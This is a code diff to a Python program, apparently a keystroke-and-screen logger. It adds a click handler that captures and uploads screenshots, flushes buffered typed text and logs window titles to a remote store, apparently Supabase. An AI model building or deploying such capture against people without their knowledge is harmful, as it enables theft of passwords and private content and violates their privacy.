@@ -2283,6 +2283,50 @@ def on_mouse_activity(*args):
     if (now - last_activity_time).total_seconds() > 1:
         last_activity_time = now
 
+def handle_mouse_click_trigger():
+    global last_screenshot_time, current_line, last_logged_window, has_new_activity_since_last_capture
+    try:
+        now = datetime.now()
+        time_since_last_screenshot = (now - last_screenshot_time).total_seconds()
+        
+        # Rate limit: Max 1 screenshot trigger per 10 seconds on mouse clicks
+        if time_since_last_screenshot >= 10:
+            window_title = get_active_window_title()
+            
+            # Capture screenshot
+            screenshot_url, screenshot_filename = capture_and_upload_screenshot("screenshot_click")
+            
+            # If screenshot was skipped as redundant, don't write log entry to Supabase
+            if screenshot_url is None and screenshot_filename is None:
+                return
+                
+            # If the screen actually changed, flush the keylog buffer and log the click
+            timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
+            buffered_text = "".join(current_line).strip()
+            current_line = [] # Reset buffer after flush
+            
+            # Since we captured a screenshot, reset idle timers and flags
+            last_screenshot_time = now
+            last_logged_window = window_title
+            has_new_activity_since_last_capture = False
+            
+            if buffered_text:
+                log_msg = f"[Mouse Click] {buffered_text}"
+            else:
+                log_msg = "[Mouse Click] (Activity detected)"
+                
+            write_log(timestamp, window_title, log_msg, screenshot_url, screenshot_filename)
+    except Exception as e:
+        print(f"Error handling mouse click trigger: {e}")
+
+def on_click(x, y, button, pressed):
+    global last_activity_time
+    now = datetime.now()
+    if pressed:
+        last_activity_time = now
+        # Trigger rate-limited capture
+        handle_mouse_click_trigger()
+
 def periodic_checker():
     global last_activity_time, last_screenshot_time, current_line
     while True:
@@ -2422,7 +2466,7 @@ if __name__ == '__main__':
         # Start mouse activity listener thread
         mouse_listener = pynput.mouse.Listener(
             on_move=on_mouse_activity,
-            on_click=on_mouse_activity,
+            on_click=on_click,
             on_scroll=on_mouse_activity
         )
         mouse_listener.start()
